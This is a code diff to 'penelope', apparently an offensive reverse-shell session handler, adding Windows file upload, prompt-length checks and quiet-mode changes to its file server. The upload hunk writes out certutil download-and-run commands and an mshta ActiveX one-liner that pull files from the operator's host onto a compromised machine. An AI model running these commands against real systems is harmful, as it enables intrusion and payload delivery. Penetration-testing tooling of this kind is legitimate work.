@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.11.0"
+__version__ = "0.11.9"
 
 import os
 import io
@@ -176,9 +176,9 @@ class MainMenu(cmd.Cmd):
 	def preloop(self):
 		__class__.load_history(options.cmd_histfile)
 
-	def postcmd(self, stop, line):
+	def precmd(self, line):
 		__class__.write_history(options.cmd_histfile)
-		return stop
+		return line
 
 	def emptyline(self):
 		self.lastcmd = None
@@ -1566,7 +1566,7 @@ class Session:
 				else:
 					self._cwd = self.control_session.exec(f"readlink -f /proc/{self.shell_pid}/cwd", value=True)
 			elif self.OS == 'Windows':
-				self._cwd = self.control_session.exec("pwd", value=True)
+				self._cwd = self.exec("cmd /c cd", value=True)
 
 		return self._cwd
 
@@ -1954,7 +1954,7 @@ class Session:
 						cmd = b' ' + cmd + b'\n'
 
 					elif self.OS == 'Windows':
-						cmd = cmd + b'\r\n'
+						cmd = cmd + b'\r\n' # TODO SOS echoed_cmd_regex check
 				else:
 					token = [rand(10) for _ in range(4)]
 
@@ -1966,7 +1966,7 @@ class Session:
 							f"echo -n ${token[2]}${token[0]}\n".encode()
 						)
 
-					elif self.OS == 'Windows': # TODO
+					elif self.OS == 'Windows': # TODO fix logic
 						if self.subtype == 'cmd':
 							sep = '&'
 						elif self.subtype == 'psh':
@@ -1976,6 +1976,9 @@ class Session:
 							f"echo %{token[0]}%%{token[2]}%{sep}{cmd.decode()}{sep}"
 							f"echo %{token[2]}%%{token[0]}%\r\n".encode()
 						)
+						if len(cmd) > MAX_CMD_PROMPT_LEN:
+							logger.error("Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
+							return False
 
 					self.subchannel.pattern = re.compile(
 						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
@@ -2072,7 +2075,7 @@ class Session:
 			logger.debug(f"{paint('FINAL TIME: ').white_BLUE}{_stop - _start}")
 
 			if value and self.subchannel.result is not False:
-				self.subchannel.result = self.subchannel.result.rstrip().decode()
+				self.subchannel.result = self.subchannel.result.strip().decode() # TODO check strip
 			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
 			self.subchannel.active = False
 
@@ -2284,7 +2287,8 @@ class Session:
 
 		while core.attached_session == self:
 			try:
-				cmd = input("\033[s\033[u")
+				cmd = input("\033[s\033[u") # TODO
+				assert len(cmd) <= MAX_CMD_PROMPT_LEN
 				readline.set_history_length(options.histlength)
 				try:
 					readline.write_history_file(self.histfile)
@@ -2293,6 +2297,8 @@ class Session:
 			except EOFError:
 				self.detach()
 				break
+			except AssertionError:
+				logger.error(f"Maximum prompt length is {MAX_CMD_PROMPT_LEN} characters. Current prompt is {len(cmd)}")
 			else:
 				self.send(cmd.encode() + b"\n")
 
@@ -2669,7 +2675,6 @@ class Session:
 
 			# Start Uploading
 			if self.agent:
-
 				stdin_stream = self.new_streamID
 				stderr_stream = self.new_streamID
 
@@ -2772,16 +2777,45 @@ class Session:
 			return altnames
 
 		elif self.OS == 'Windows':
-			#server = FileServer(resolved_items)
-			#x = [server.add(item) for item in resolved_items]
-			#print(x)
-			#server.start()
-			#for urlpath in x:
-			#	response = self.exec(rf"bitsadmin /transfer myDownloadJob /download /priority normal http://{self._host}:{server.port}{urlpath} %cd%\{urlpath.lstrip('/')}", value=True, preserve_dir=True)
-			#print(response)
-			#server.stop()
+			tempfile_zip = f'/dev/shm/{rand(16)}.zip'
+			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
+			with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
+				for item in resolved_items:
+					if isinstance(item, tuple):
+						filename, data = item
+						if randomize_fname:
+							filename = Path(filename)
+							altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
+						else:
+							altname = filename
+						zip_info = zipfile.ZipInfo(filename=str(altname))
+						zip_info.date_time = time.localtime(time.time())[:6]
+						myzip.writestr(zip_info, data)
+					else:
+						altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
+						myzip.write(item, arcname=altname)
 
-			logger.warning("Upload on Windows shells is not implemented yet")
+			server = FileServer(host=self._host, password=rand(8), quiet=True)
+			urlpath_zip = server.add(tempfile_zip)
+
+			cwd_escaped = self.cwd.replace('\\', '\\\\')
+			tmp_escaped = self.exec("echo %TEMP%", value=True).replace('\\', '\\\\')
+			temp_remote_file_zip = urlpath_zip.split("/")[-1]
+
+			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}"'
+			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()"'
+
+			with open(tempfile_bat, "w") as f:
+				f.write(fetch_cmd + "\n")
+				f.write(unzip_cmd)
+
+			urlpath_bat = server.add(tempfile_bat)
+			temp_remote_file_bat = urlpath_bat.split("/")[-1]
+			server.start()
+			response = self.exec(
+				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
+				value=True, timeout=None)
+			server.stop()
 
 	def script(self, local_script):
 		if not self.agent:
@@ -3425,12 +3459,13 @@ def agent():
 
 
 class FileServer:
-	def __init__(self, items=None, port=None, host=None, password=None):
+	def __init__(self, *items, port=None, host=None, password=None, quiet=False):
 		self.port = port or 8000
 		self.host = host or options.default_interface
 		self.host = Interfaces().translate(self.host)
-		self.items = items or ['.']
+		self.items = items
 		self.password = password + '/' if password else ''
+		self.quiet = quiet
 		self.filemap = {}
 		for item in self.items:
 			self.add(item)
@@ -3443,7 +3478,8 @@ class FileServer:
 		item = os.path.abspath(item)
 
 		if not os.path.exists(item):
-			logger.warning(f"'{item}' does not exist and will be ignored.")
+			if not self.quiet:
+				logger.warning(f"'{item}' does not exist and will be ignored.")
 			return None
 
 		if item in self.filemap.values():
@@ -3462,7 +3498,8 @@ class FileServer:
 		if item in self.filemap:
 			del self.filemap[f"/{os.path.basename(os.path.normpath(item))}"]
 		else:
-			logger.warning(f"{item} is not served.")
+			if not self.quiet:
+				logger.warning(f"{item} is not served.")
 
 	@property
 	def hints(self):
@@ -3487,7 +3524,7 @@ class FileServer:
 
 	@handle_bind_errors
 	def _start(self):
-		filemap, host, port, password = self.filemap, self.host, self.port, self.password
+		filemap, host, port, password, quiet = self.filemap, self.host, self.port, self.password, self.quiet
 
 		class CustomTCPServer(socketserver.TCPServer):
 			allow_reuse_address = True
@@ -3516,19 +3553,22 @@ class FileServer:
 
 		class CustomHandler(http.server.SimpleHTTPRequestHandler):
 			def do_GET(self):
-				if self.path == '/' + password:
-					response = ''
-					for path in filemap.keys():
-						response += f'<li><a href="{path}">{path}</a></li>'
-					response = response.encode()
-					self.send_response(200)
-					self.send_header("Content-type", "text/html")
-					self.send_header("Content-Length", str(len(response)))
-					self.end_headers()
+				try:
+					if self.path == '/' + password:
+						response = ''
+						for path in filemap.keys():
+							response += f'<li><a href="{path}">{path}</a></li>'
+						response = response.encode()
+						self.send_response(200)
+						self.send_header("Content-type", "text/html")
+						self.send_header("Content-Length", str(len(response)))
+						self.end_headers()
 
-					self.wfile.write(response)
-				else:
-					super().do_GET()
+						self.wfile.write(response)
+					else:
+						super().do_GET()
+				except Exception as e:
+					logger.error(e)
 
 			def translate_path(self, path):
 				path = path.split('?', 1)[0]
@@ -3548,6 +3588,8 @@ class FileServer:
 				return ""
 
 			def log_message(self, format, *args):
+				if quiet:
+					return None
 				message = format % args
 				response = message.translate(self._control_char_table).split(' ')
 				if not response[0].startswith('"'):
@@ -3571,12 +3613,14 @@ class FileServer:
 			self.httpd.server_activate()
 			self.id = core.new_fileserverID
 			core.fileservers[self.id] = self
-			print(self.hints)
+			if not quiet:
+				print(self.hints)
 			self.httpd.serve_forever()
 
 	def stop(self):
 		del core.fileservers[self.id]
-		logger.warning(f"Shutting down Fileserver #{self.id}")
+		if not self.quiet:
+			logger.warning(f"Shutting down Fileserver #{self.id}")
 		self.httpd.shutdown()
 
 ################################## GENERAL PURPOSE CUSTOM CODE ####################################
@@ -3882,8 +3926,11 @@ def custom_excepthook(*args):
     else:
         return
     traceback.print_exception(exc_type, exc_value, exc_traceback)
-    print(f"\nPython version: {sys.version}")
+    print()
+    print(f"Penelope version: {__version__}")
+    print(f"Python version: {sys.version}")
     print(f"System: {platform.version()}")
+    menu.show()
 
 sys.excepthook = custom_excepthook
 threading.excepthook = custom_excepthook
@@ -3894,6 +3941,7 @@ OSes = {'Unix':'🐧', 'Windows':'💻'}
 TTY_NORMAL = termios.tcgetattr(sys.stdin)
 DISPLAY = 'DISPLAY' in os.environ
 NET_BUF_SIZE = 16384
+MAX_CMD_PROMPT_LEN = 335
 LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
 MESSENGER = inspect.getsource(Messenger)
 STREAM = inspect.getsource(Stream)
@@ -4251,7 +4299,7 @@ def main():
 
 	# File Server
 	elif options.serve:
-		server = FileServer(options.ports, options.port, options.interface, options.password)
+		server = FileServer(*options.ports or '.', port=options.port, host=options.interface, password=options.password)
 		if server.filemap:
 			server.start()
 		else:
